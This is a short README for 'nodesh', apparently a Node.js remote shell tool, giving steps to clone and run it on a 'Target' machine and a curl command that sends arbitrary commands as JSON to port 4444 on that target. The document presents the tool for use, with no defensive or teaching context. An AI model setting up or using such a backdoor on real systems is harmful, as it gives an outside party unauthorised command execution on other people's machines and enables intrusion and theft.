# nodesh

Nodejs reverse shell.

## Use

Target:

```bash
git clone https://github.com/miguelzacca/nodesh.git
./nodesh/nodesh.bat
```

## Controller (curl or others, ex: Postman):

curl:

```bash
curl <target_ip>:4444/run --json '{"cmd":"<your_command>"}'
```
